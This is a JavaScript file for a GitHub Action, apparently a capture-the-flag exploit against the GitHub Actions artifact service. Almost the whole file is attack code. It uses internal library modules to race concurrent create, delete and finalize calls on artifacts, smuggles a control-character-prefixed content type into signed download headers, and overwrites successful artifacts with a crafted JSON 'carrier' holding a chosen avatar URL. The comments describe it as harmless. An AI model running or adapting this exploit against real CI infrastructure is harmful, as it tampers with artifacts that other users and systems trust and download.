// Copy into a Node 24 JavaScript GitHub Action. Requires @actions/artifact and
// @azure/storage-blob in the workflow checkout. Uses harmless JSON only.
// No runtime tokens or signed URLs are printed.
import { createHash } from 'node:crypto';
import https from 'node:https';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { BlobClient } from '@azure/storage-blob';

const libDir = dirname(fileURLToPath(import.meta.resolve('@actions/artifact')));
const internal = async (name) => import(pathToFileURL(join(libDir, name)).href);
const { internalArtifactTwirpClient } = await internal('internal/shared/artifact-twirp-client.js');
const { getBackendIdsFromToken } = await internal('internal/shared/util.js');
const { StringValue } = await internal('generated/index.js');

const client = internalArtifactTwirpClient({ maxAttempts: 1 });
const ids = getBackendIdsFromToken();
const odd = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"race"}');
const hash = StringValue.create({ value: `sha256:${createHash('sha256').update(placeholder).digest('hex')}` });
const runId = process.env.GITHUB_RUN_ID ?? Date.now().toString(36);
const repo = process.env.GITHUB_REPOSITORY;
const rounds = Math.max(1, Math.min(50, Number(process.env.RACE_ROUNDS || 8)));
const portraitUrl = process.env.PORTRAIT_URL ||
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/lqkAAAAASUVORK5CYII=';
if (!repo) throw new Error('GITHUB_REPOSITORY is required');
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function create(name, version) {
  try {
    // Use a separate HTTP client so simultaneous CreateArtifact calls cannot
    // serialize on one connection pool.
    const result = await internalArtifactTwirpClient({ maxAttempts: 1 }).CreateArtifact({
      ...ids, name, version,
      mimeType: StringValue.create({ value: version === 7 ? 'application/json' : odd }),
    });
    return { ok: true, url: result.signedUploadUrl };
  } catch { return { ok: false }; }
}

async function upload(url, bytes) {
  if (!url) return false;
  try {
    await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
      blobHTTPHeaders: { blobContentType: odd },
    });
    return true;
  } catch { return false; }
}

async function finalize(name) {
  try {
    const result = await client.FinalizeArtifact({
      ...ids, name, size: String(placeholder.length), hash,
    });
    return { ok: true, id: String(result.artifactId) };
  } catch { return { ok: false }; }
}

async function remove(name) {
  try { return Boolean((await client.DeleteArtifact({ ...ids, name })).ok); }
  catch { return false; }
}

async function signed(name) {
  try {
    const result = await client.GetSignedArtifactURL({ ...ids, name });
    return { url: result.signedUrl, rsct: new URL(result.signedUrl).searchParams.get('rsct') };
  } catch { return {}; }
}

async function observedContentType(url) {
  if (!url) return { status: 0, value: '' };
  return new Promise((resolve) => {
    const request = https.get(url, { timeout: 12000 }, (response) => {
      const value = response.headers['content-type'] ?? '';
      response.resume();
      response.on('end', () => resolve({ status: response.statusCode, value }));
    });
    request.on('timeout', () => request.destroy());
    request.on('error', () => resolve({ status: 0, value: '' }));
  });
}

async function trial(index, firstVersion, kind, delay) {
  const name = `ctf-race-${runId}-${index}-${firstVersion}-${kind}-${delay + 30}`;
  const first = await create(name, firstVersion);
  const firstUploaded = await upload(first.url, placeholder);
  let oldFinal = { ok: false };
  if (kind === 'finalized') oldFinal = await finalize(name);

  let deleted;
  let second;
  if (kind === 'pending') {
    deleted = await remove(name);
    second = await create(name, firstVersion === 7 ? 6 : 7);
  } else if (delay < 0) {
    const deletion = remove(name);
    await sleep(-delay);
    const creation = create(name, firstVersion === 7 ? 6 : 7);
    [deleted, second] = await Promise.all([deletion, creation]);
  } else {
    const creation = create(name, firstVersion === 7 ? 6 : 7);
    await sleep(delay);
    const deletion = remove(name);
    [deleted, second] = await Promise.all([deletion, creation]);
  }
  const secondUploaded = await upload(second.url, placeholder);
  const final = await finalize(name);
  const view = await signed(name);
  const observed = view.rsct?.includes('\u0085')
    ? await observedContentType(view.url) : { status: 0, value: '' };
  const candidateId = final.id ?? oldFinal.id;
  const winner = Boolean(candidateId && observed.status === 200 && observed.value === odd);
  const result = {
    index, firstVersion, kind, delay, first: first.ok, firstUploaded,
    oldFinal: oldFinal.ok, deleted, second: second.ok, secondUploaded,
    final: final.ok, candidateId, rsctCodepoints: view.rsct
      ? Array.from(view.rsct, (c) => c.codePointAt(0)) : [], winner,
    observedStatus: observed.status,
    observedTypeCodepoints: Array.from(observed.value, (c) => c.codePointAt(0)),
  };

  if (winner) {
    const repository = `${repo}/actions/artifacts/${candidateId}/zip`;
    const carrier = Buffer.from(JSON.stringify({
      full_name: repository,
      owner: { login: 'cassette', avatar_url: portraitUrl },
      description: 'Repo Cassette artifact', stargazers_count: 0,
    }));
    result.carrierWrites = await Promise.all([first.url, second.url].filter(Boolean)
      .map((url) => upload(url, carrier)));
    result.repository = repository;
  }
  return result;
}

async function directTrial(index, leadVersion, delay) {
  const name = `ctf-race-${runId}-${index}-${leadVersion}-direct-${delay}`;
  const firstPromise = create(name, leadVersion);
  if (delay) await sleep(delay);
  const secondPromise = create(name, leadVersion === 7 ? 6 : 7);
  const [first, second] = await Promise.all([firstPromise, secondPromise]);
  const uploaded = await Promise.all([first.url, second.url].filter(Boolean)
    .map((url) => upload(url, placeholder)));
  const finalRows = await Promise.all([finalize(name), finalize(name)]);
  const candidateId = finalRows.find((row) => row.id)?.id;
  const view = await signed(name);
  const observed = view.rsct?.includes('\u0085')
    ? await observedContentType(view.url) : { status: 0, value: '' };
  const winner = Boolean(candidateId && observed.status === 200 && observed.value === odd);
  const result = {
    index, leadVersion, kind: 'direct', delay,
    first: first.ok, second: second.ok,
    bothCreated: first.ok && second.ok,
    sameUploadUrl: Boolean(first.url && second.url && first.url === second.url),
    uploaded, final: finalRows.map((row) => row.ok), candidateId,
    rsctCodepoints: view.rsct
      ? Array.from(view.rsct, (c) => c.codePointAt(0)) : [],
    observedStatus: observed.status,
    observedTypeCodepoints: Array.from(observed.value, (c) => c.codePointAt(0)),
    winner,
  };
  if (winner) {
    const repository = `${repo}/actions/artifacts/${candidateId}/zip`;
    const carrier = Buffer.from(JSON.stringify({
      full_name: repository,
      owner: { login: 'cassette', avatar_url: portraitUrl },
      description: 'Repo Cassette artifact', stargazers_count: 0,
    }));
    result.carrierWrites = await Promise.all([first.url, second.url].filter(Boolean)
      .map((url) => upload(url, carrier)));
    result.repository = repository;
  }
  return result;
}

const trials = [];
for (let i = 0; i < rounds; i++) {
  const version = i % 2 ? 7 : 6;
  if (process.env.RACE_ALL === '1') {
    trials.push(() => trial(i, version, 'pending', 0));
    for (const delay of [-20, 0, 20]) {
      trials.push(() => trial(i, version, 'finalized', delay));
    }
  }
  for (const delay of [0, 2, 20]) {
    trials.push(() => directTrial(i, version, delay));
  }
}
const results = [];
for (let i = 0; i < trials.length; i += 8) {
  results.push(...await Promise.all(trials.slice(i, i + 8).map((fn) => fn())));
}
console.log('RACE_SUMMARY', JSON.stringify({
  trials: results.length,
  winners: results.filter((r) => r.winner).length,
  directBothCreated: results.filter((r) => r.kind === 'direct' && r.bothCreated).length,
  rsctOdd: results.filter((r) => r.rsctCodepoints.includes(133)).length,
  rsctJson: results.filter((r) => r.rsctCodepoints.join(',') ===
    Array.from('application/json', (c) => c.codePointAt(0)).join(',')).length,
  rsctZip: results.filter((r) => r.rsctCodepoints.join(',') ===
    Array.from('application/zip', (c) => c.codePointAt(0)).join(',')).length,
  oddHeaders: results.filter((r) => r.rsctCodepoints.includes(133)).map((r) => ({
    kind: r.kind, leadVersion: r.leadVersion ?? r.firstVersion,
    delay: r.delay, candidateId: r.candidateId,
    observedStatus: r.observedStatus,
    observedTypeCodepoints: r.observedTypeCodepoints,
  })),
  candidates: results.filter((r) => r.winner).map((r) => ({
    repository: r.repository, carrierWrites: r.carrierWrites,
    kind: r.kind, delay: r.delay, firstVersion: r.firstVersion,
  })),
}));

